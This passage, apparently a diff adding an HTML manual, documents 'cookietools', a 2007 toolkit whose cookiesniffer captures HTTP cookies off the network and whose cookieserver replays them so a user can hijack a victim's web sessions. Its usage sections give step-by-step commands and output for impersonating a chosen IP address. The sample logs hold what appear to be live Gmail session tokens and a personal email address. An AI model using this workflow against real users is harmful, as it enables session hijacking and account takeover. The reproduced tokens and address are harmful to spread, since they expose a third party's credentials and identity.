+1195641102.972861 Set-Cookie: SID=DQAAAGwAAACE2b7aSYrQhQLPo-6CPWyHxwgtAQHWvHMkNNlhgioxnGVZ94fyOyP0DHOY9vDqO9uOQSgvNO3B3g4beCKYNbek6PctrTdrUjNKfGuFk_Z_kdFYB72TlLsL8HututH5PNMSHkFXIC8A0510ugE1g0qF; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641106.113463 Link: http://mail.google.com/mail/channel/bind?at=xn3j37i0ev7wcknl8mwn6svd7dl85s&amp;VER=5&amp;it=1552&amp;SID=B7BBE82A5077EC37&amp;RID=89042&amp;zx=d7qazjopodh6&amp;t=1
+1195641106.113463 Set-Cookie: __utma=173272373.1523618165.1195636735.1195636735.1195636735.1; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641106.113463 Set-Cookie: __utmc=173272373; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641106.113463 Set-Cookie: __utmz=173272373.1195636735.1.1.utmccn=(referral)|utmcsr=mail.google.com|utmcct=/mail/|utmcmd=referral; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641106.113463 Set-Cookie: GMAIL_STAT_PENDING=/S:a=lc&amp;sv=tl&amp;ev=tl&amp;s=25&amp;t=1637&amp;w=623&amp;; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641106.113463 Set-Cookie: GX=DQAAAG8AAACjafoPn5mnL_8MJW1nVv5YXx3DKtO9FNCcs9XOGqKcKQ3sUbDCPajbczMVOxCS39raD7wjL5G000VJRQ-BvBJtwX-t1mWdXCyGp9LOWfrnjGeSx5OpA2o2JFJDSRF_puHr_a7stqXQjUqdZGBJkB9v; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641106.113463 Set-Cookie: S=gmail=L0lNcfSZrxf9zS0_bnoG1g:gmail_yj=j8AXLSaEdnrRWXL9Mck0Yw:gmproxy=aULplbxy37k:gmproxy_yj=Ozc4CqRZ6RY:gmproxy_yj_sub=eGfjrGPBT6Y; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641106.113463 Set-Cookie: GMAIL_AT=xn3j37i0ev7wcknl8mwn6svd7dl85s; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641106.113463 Set-Cookie: gmailchat=charlieroot69@gmail.com/138671; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641106.113463 Set-Cookie: TZ=-60; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641106.113463 Set-Cookie: GMAIL_RTT=121; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641106.113463 Set-Cookie: GMAIL_LOGIN=T1195636734978/1195636734978/1195636738633; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641110.984025 Link: http://mail.google.com/mail/channel/bind?at=xn3j37i0ev7wcknl8mwn6svd7dl85s&amp;VER=5&amp;it=6425&amp;SID=B7BBE82A5077EC37&amp;RID=89043&amp;TYPE=terminate&amp;zx=eh281lp7e4it
+1195641110.984025 Set-Cookie: __utma=173272373.1523618165.1195636735.1195636735.1195636735.1; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641110.984025 Set-Cookie: __utmc=173272373; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641110.984025 Set-Cookie: __utmz=173272373.1195636735.1.1.utmccn=(referral)|utmcsr=mail.google.com|utmcct=/mail/|utmcmd=referral; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641110.984025 Set-Cookie: GMAIL_STAT_PENDING=/S:a=lc&amp;sv=tl&amp;ev=tl&amp;s=25&amp;t=1637&amp;w=623&amp;; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641110.984025 Set-Cookie: GX=DQAAAG8AAACjafoPn5mnL_8MJW1nVv5YXx3DKtO9FNCcs9XOGqKcKQ3sUbDCPajbczMVOxCS39raD7wjL5G000VJRQ-BvBJtwX-t1mWdXCyGp9LOWfrnjGeSx5OpA2o2JFJDSRF_puHr_a7stqXQjUqdZGBJkB9v; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641110.984025 Set-Cookie: S=gmail=L0lNcfSZrxf9zS0_bnoG1g:gmail_yj=j8AXLSaEdnrRWXL9Mck0Yw:gmproxy=aULplbxy37k:gmproxy_yj=Ozc4CqRZ6RY:gmproxy_yj_sub=eGfjrGPBT6Y; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641110.984025 Set-Cookie: GMAIL_AT=xn3j37i0ev7wcknl8mwn6svd7dl85s; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641110.984025 Set-Cookie: gmailchat=charlieroot69@gmail.com/138671; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641110.984025 Set-Cookie: TZ=-60; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641110.984025 Set-Cookie: GMAIL_RTT=121; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641110.984025 Set-Cookie: GMAIL_LOGIN=T1195636734978/1195636734978/1195636738633; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641110.984025 Set-Cookie: SID=DQAAAGwAAACE2b7aSYrQhQLPo-6CPWyHxwgtAQHWvHMkNNlhgioxnGVZ94fyOyP0DHOY9vDqO9uOQSgvNO3B3g4beCKYNbek6PctrTdrUjNKfGuFk_Z_kdFYB72TlLsL8HututH5PNMSHkFXIC8A0510ugE1g0qF; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+xenion@gollum:~/dev/cookietools$
+</PRE>
+Each line in the session file has the time-stamp, quite rendundant. This allows you to sort (remember to use option -n for numerical value sorting!!) the logs of multiple connections easily, considering the time-stamps. This is an example (get the last value (= the actual value) of the cookie with name GX):
+
+<P>
+<PRE>
+xenion@gollum:~/dev/cookietools$ cat logz/192.168.1.2-*.session | sort -n | grep "Set-Cookie: GX" | tail -1
+1195641110.984025 Set-Cookie: GX=DQAAAG8AAACjafoPn5mnL_8MJW1nVv5YXx3DKtO9FNCcs9XOGqKcKQ3sUbDCPajbczMVOxCS39raD7wjL5G000VJRQ-BvBJtwX-t1mWdXCyGp9LOWfrnjGeSx5OpA2o2JFJDSRF_puHr_a7stqXQjUqdZGBJkB9v; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+xenion@gollum:~/dev/cookietools$
+</PRE>
+
+<P>
+
+<H2><A NAME="SECTION00032000000000000000">
+How it works</A>
+</H2>
+The captured packets are handled by libnids that reconstructs each new tcp connection. cookiesniffer reconstructs also already existing tcp connections by injecting well crafted tcp three-way handshakes into libnids. Each packet is also  handled individually by a set of protocol dissectors. This is done because libnids won't reconstruct tcp connections with some missing tcp packets (causing an information loss). This may lead to some dup entries in the logs but it isn't a problem, the time-stamps will always indicate the last valid value of each cookie. According to rfc2616 (Hypertext Transfer Protocol - HTTP/1.1) section 4.4, the transfer-length of the HTTP message body can be determined in 5 ways. cookiesniffer supports ways 1, 3, 5 but not 2 ("chunked" transfer-coding) and 4 (media type "multipart/byteranges"). With 2 and 4 the connections state changes from "synchronized" to "desynchronized". The connections return "synchronized" with the first packet beginning with a valid HTTP message (this is called "resynchronization").
+
+<H2><A NAME="SECTION00033000000000000000">
+The analyzers</A>
+</H2>
+In the <SPAN  CLASS="textit">bin/analyzers</SPAN> directory there are some Bash scripts that can help you to analyze quickly the logs of cookiesniffer. This is a brief description:
+
+<UL>
+<LI><SPAN  CLASS="textit">vision.sh</SPAN>: for each detected client (or for a specified client) it returns the links list, the cookie hosts and the cookies value (the last value of each one). This is the most useful (and slow) script.
+</LI>
+<LI><SPAN  CLASS="textit">links.sh</SPAN>: for each detected client it returns the cookie hosts list and the links list.
+</LI>
+<LI><SPAN  CLASS="textit">names.sh</SPAN>: for each detected client and for each detected cookies host it returns the list of the names of the cookies for that host.
+</LI>
+<LI><SPAN  CLASS="textit">occurrences.sh</SPAN>: for each detected client it returns the list of the occurrences of each cookie value (you must use it only when there aren't name collisions between cookies of different hosts, if happens the output is somewhat wrong).
+</LI>
+</UL>
+
+<P>
+This is an example of execution of <SPAN  CLASS="textit">vision.sh</SPAN>:
+
+<P>
+<PRE>
+xenion@gollum:~/dev/cookiestools$ bin/analyzers/vision.sh logz/
+======================== Client 192.168.1.2 ========================
+
+----- Links -----
+link[192.168.1.2] http://mail.google.com/mail/channel/bind?at=xn3j37i0ev7wcknl8mwn6svd7dl85s&amp;VER=5&amp;it=9&amp;SID=B7BBE82A5077EC37&amp;RID=89041&amp;zx=it9k92y1rgwv&amp;t=1
+link[192.168.1.2] http://mail.google.com/mail/?ui=2&amp;ik=a70d6eca1f&amp;view=tl&amp;start=0&amp;num=70&amp;rt=h&amp;search=inbox
+link[192.168.1.2] http://mail.google.com/mail/?ui=2&amp;ik=a70d6eca1f&amp;view=ad&amp;ak=s6cmkdkein1jmp2a91ddp8yun54n24w
+link[192.168.1.2] http://mail.google.com/mail/channel/bind?at=xn3j37i0ev7wcknl8mwn6svd7dl85s&amp;VER=5&amp;it=1552&amp;SID=B7BBE82A5077EC37&amp;RID=89042&amp;zx=d7qazjopodh6&amp;t=1
+link[192.168.1.2] http://mail.google.com/mail/channel/bind?at=xn3j37i0ev7wcknl8mwn6svd7dl85s&amp;VER=5&amp;it=6425&amp;SID=B7BBE82A5077EC37&amp;RID=89043&amp;TYPE=terminate&amp;zx=eh281lp7e4it
+link[192.168.1.2] http://bbc.com/
+link[192.168.1.2] http://www.bbc.co.uk/?ok
+link[192.168.1.2] http://secure-uk.imrworldwide.com/cgi-bin/m?rnd=1195641113793&amp;ci=bbc&amp;cg=0&amp;sr=1280x1024&amp;cd=24&amp;lg=en-US&amp;je=y&amp;ck=y&amp;tz=1&amp;ct=&amp;hp=&amp;tl=BBC%20-%20bbc.co.uk%20homepage%20-%20Home%20of%20the%20BBC%20on%20the%20Internet&amp;si=http%3A//www.bbc.co.uk/%3Fok&amp;rp=
+link[192.168.1.2] http://ad.uk.doubleclick.net/adx/bbccom.live.site.www/bbc_homepage_int;sectn=nonnews;nnsec=homepage_int;callback=BBCComAds.store;requestId=mpu;dcmt=application/x-javascript;sz=250x250;tile=4;ord=59391655229326?
+link[192.168.1.2] http://ad.uk.doubleclick.net/adx/bbccom.live.site.www/bbc_homepage_int;sectn=nonnews;nnsec=homepage_int;callback=BBCComAds.store;requestId=bottom;dcmt=application/x-javascript;sz=468x60;tile=3;ord=59391655229326?
+link[192.168.1.2] http://ad.uk.doubleclick.net/adx/bbccom.live.site.www/bbc_homepage_int;sectn=nonnews;nnsec=homepage_int;callback=BBCComAds.store;requestId=skyscraper;dcmt=application/x-javascript;sz=160x600;tile=2;ord=59391655229326?
+link[192.168.1.2] http://ad.uk.doubleclick.net/adx/bbccom.live.site.www/bbc_homepage_int;sectn=nonnews;nnsec=homepage_int;callback=BBCComAds.store;requestId=top;dcmt=application/x-javascript;sz=728x90;tile=1;ord=59391655229326?
+link[192.168.1.2] http://ad.doubleclick.net/noidadx/bbccom.live.site.www/bbc_homepage_int;sectn=nonnews;nnsec=homepage_int;callback=BBCComAds.store;requestId=top;dcmt=application/x-javascript;sz=728x90;tile=1;ord=59391655229326?
+
+----- Cookies -----
+hosts[192.168.1.2:] co.uk doubleclick.net google.com imrworldwide.com 
+
+names[192.168.1.2:co.uk] BBC-UID BBCNewsAudience 
+values[192.168.1.2:co.uk] 'BBC-UID'='2497244450a76963803bdc1cf0f0a902643cab68609010733b5accb5b3a90ab90Mozilla%2f5%2e0%20%28X11%3b%20U%3b%20Linux%20i686%3b%20en%2dUS%3b%20rv%3a1%2e8%2e1%2e8%29%20Gecko%2f20071004%20Iceweasel%2f2%2e0%2e0%2e8%20%28Debian%2d2%2e0%2e0%2e8%2d1%29'
+values[192.168.1.2:co.uk] 'BBCNewsAudience'='International'
+
+names[192.168.1.2:doubleclick.net] id test_cookie 
+values[192.168.1.2:doubleclick.net] 'id'='800001136db5ff0'
+values[192.168.1.2:doubleclick.net] 'test_cookie'='CheckForPermission'
+
+names[192.168.1.2:google.com] GMAIL_AT GMAIL_LOGIN GMAIL_RTT GMAIL_STAT_PENDING GX S SID TZ __utma __utmc __utmz gmailchat 
+values[192.168.1.2:google.com] 'GMAIL_AT'='xn3j37i0ev7wcknl8mwn6svd7dl85s'
+values[192.168.1.2:google.com] 'GMAIL_LOGIN'='T1195636734978/1195636734978/1195636738633'
+values[192.168.1.2:google.com] 'GMAIL_RTT'='121'
+values[192.168.1.2:google.com] 'GMAIL_STAT_PENDING'='/S:a'
+values[192.168.1.2:google.com] 'GX'='DQAAAG8AAACjafoPn5mnL_8MJW1nVv5YXx3DKtO9FNCcs9XOGqKcKQ3sUbDCPajbczMVOxCS39raD7wjL5G000VJRQ-BvBJtwX-t1mWdXCyGp9LOWfrnjGeSx5OpA2o2JFJDSRF_puHr_a7stqXQjUqdZGBJkB9v'
+values[192.168.1.2:google.com] 'S'='gmail'
+values[192.168.1.2:google.com] 'SID'='DQAAAGwAAACE2b7aSYrQhQLPo-6CPWyHxwgtAQHWvHMkNNlhgioxnGVZ94fyOyP0DHOY9vDqO9uOQSgvNO3B3g4beCKYNbek6PctrTdrUjNKfGuFk_Z_kdFYB72TlLsL8HututH5PNMSHkFXIC8A0510ugE1g0qF'
+values[192.168.1.2:google.com] 'TZ'='-60'
+values[192.168.1.2:google.com] '__utma'='173272373.1523618165.1195636735.1195636735.1195636735.1'
+values[192.168.1.2:google.com] '__utmc'='173272373'
+values[192.168.1.2:google.com] '__utmz'='173272373.1195636735.1.1.utmccn'
+values[192.168.1.2:google.com] 'gmailchat'='charlieroot69@gmail.com/138671'
+
+names[192.168.1.2:imrworldwide.com] IMRID V5 
+values[192.168.1.2:imrworldwide.com] 'IMRID'='R0QHlz699OQAAT@qiAI'
+values[192.168.1.2:imrworldwide.com] 'V5'='AStfMFklAAMYVFBNBz4jIz00OQYjK1InHlIk1A??'
+
+xenion@gollum:~/dev/cookiestools$
+</PRE>
+<H2><A NAME="SECTION00034000000000000000">
+Dependencies, compilation and execution</A>
+</H2>
+The required libs are libpcap (&ge;0.7), libnet (&ge;1.1) and libnids (&ge;1.20).  In debian, you need (at least) the following packages:
+
+<UL>
+<LI>libnids1
+</LI>
+<LI>libnids-dev
+</LI>
+<LI>libnet1
+</LI>
+<LI>libnet1-dev
+</LI>
+<LI>libpcap0.7
+</LI>
+<LI>libpcap0.7-dev
+</LI>
+</UL>
+
+<P>
+To compile, type "make" in the cookietools top directory. The execution paths:
+
+<UL>
+<LI>cookiesniffer: <SPAN  CLASS="textit">bin/cookiesniffer</SPAN>
+</LI>
+<LI>log analyzers: <SPAN  CLASS="textit">bin/analyzers/vision.sh bin/analyzers/links.sh bin/analyzers/names.sh bin/analyzers/occurrences.sh</SPAN>
+</LI>
+</UL>
+
+<P>
+
+<H1><A NAME="SECTION00040000000000000000">
+cookieserver</A>
+</H1>
+
+<P>
+With cookieserver you can impersonate the cookies of someone else in your browser using the logs of cookiesniffer (in few seconds). This attack is also called "side-jacking", "cookie replay attack" and "HTTP session hijacking" but probably I'm missing other fancy names. This is something known from ten years but that is still (too much) effective.
+
+<P>
+
+<H2><A NAME="SECTION00041000000000000000">
+Usage</A>
+</H2>
+The two mandatory input parameters are the logs directory of cookiesniffer and the ip (ipv4 address) of the web user you want to impersonate. Only the cookies of that ip will be considered. This is an example of execution (impersonate web user with ip 192.168.1.2 using 'logz' as cookiesniffer logs directory):
+
+<P>
+<PRE>
+xenion@gollum:~/dev/cookietools$ bin/cookieserver/startup.sh logz 192.168.1.2
+checking for: socat sed grep egrep cut cat head sort tail uniq 
+checking log directory...
+Client: '192.168.1.2' Logdir: 'logz'
+Cookie Server: 127.0.0.1:8181
+tmp files will be generated at each request (slower but dynamic)
+Listening...
+</PRE>
+
+<P>
+You can run cookieserver while cookiesniffer is gathering information from the network, the cookies value will be updated accordingly to their time-stamps. You can optionally add a third parameter, the constant string 'static'. It will force cookieserver to generate static information, you should enable this option only when the information you are interested in is fixed and don't change. This is an example:
+
+<P>
+<PRE>
+xenion@gollum:~/dev/cookietools$ bin/cookieserver/startup.sh logz 192.168.1.2 static
+checking for: socat sed grep egrep cut cat head sort tail uniq 
+checking log directory...
+Client: '192.168.1.2' Logdir: 'logz'
+Cookie Server: 127.0.0.1:8181
+tmp files will be generated only once (faster but static)
+Building tmp files... (logdir: 'logz' client: '192.168.1.2')
+Listening...
+</PRE>
+
+<P>
+You can handle complex scenarios by modifying the Bash scripts <SPAN  CLASS="textit">bin/cookieserver/subset.sh</SPAN> and <SPAN  CLASS="textit">bin/cookieserver/build_tmp.sh</SPAN>. When you've started cookieserver, start your browser and set the http proxy to 127.0.0.1:8181. The recommended browser is Firefox with the SwitchProxy plug-in. Go to URL http://x where x can be everything, the resulting  HTML page is the same (generated by cookieserver). This is the HTML page structure you should see:
+<PRE>
+CookieServer
+Logdir: 'logz'
+Client: '192.168.1.2'
+Faking host: x
+Cookie hosts (12):
+    * google.com
+    * ...
+Links (21):
+    * http://mail.google.com/mail/...
+    * ...
+Set-Cookies (16):
+Set-Cookie: GMAIL_AT=...; path=/; domain=google.com;
+Set-Cookie: ...
+EOF
+</PRE>
+
+<P>
+A brief description: <SPAN  CLASS="textit">Logdir</SPAN> and <SPAN  CLASS="textit">Client</SPAN> are the input parameters, the <SPAN  CLASS="textit">Faking host</SPAN> is the hostname that cookieserver is faking, <SPAN  CLASS="textit">Cookie hosts</SPAN> is the list of the hosts with cookies, <SPAN  CLASS="textit">Links</SPAN> is the list of retrieved URLs and <SPAN  CLASS="textit">Set-Cookies</SPAN> is the list of  Set-Cookie headers present in the HTTP headers of the current displayed page. Visiting exactly the URL 'http://x' will never set any cookie because there isn't a matching cookie domain. But when you visit URLs proposed in the <SPAN  CLASS="textit">Cookie hosts</SPAN> list there will be always some matching domains and the respective cookies will be set in your browser (overwriting them if they're already present). In the example, if you visit URL http://google.com the cookie GMAIL_AT (with others) will be set. Now, you can use the cookies you have set simply restoring the original proxy settings in your browser.
+
+<P>
+
+<H2><A NAME="SECTION00042000000000000000">
+How it works</A>
+</H2>
+It's a set of Bash scripts that implement a simple HTTP web server. The TCP connections are handled with socat. Each HTTP reply includes the Set-Cookie headers you can see in the Set-Cookies list.
+
+<P>
+
+<H2><A NAME="SECTION00043000000000000000">
+Dependencies and execution</A>
+</H2>
+The required standard UNIX tools are sed, grep, egrep, cut, cat, head, sort, tail, uniq. You must also have the bash shell and  socat, a multipurpose relay (SOcket CAT). It's also recommended to use the browser Firefox with the SwitchProxy plug-in. The execution path:
+
+<UL>
+<LI>cookieserver: <SPAN  CLASS="textit">bin/cookieserver/startup.sh</SPAN>
+</LI>
+</UL>
+
+<P>
+
+<H1><A NAME="SECTION00050000000000000000"></A>
+<A NAME="Links"></A>
+<BR>
+Links
+</H1>
+
+<UL>
+<LI>Antifork: <A NAME="tex2html1"
+  HREF="http://www.antifork.org">http://www.antifork.org</A>
+</LI>
+<LI>xenion headquarter: <A NAME="tex2html2"
+  HREF="http://xenion.antifork.org">http://xenion.antifork.org</A>
+</LI>
+</UL>
+
+<P>
+<BR><HR>
+<ADDRESS>
+xenion - Tue Dec  4 15:24:23 CET 2007
+</ADDRESS>
+</BODY>
+</HTML>
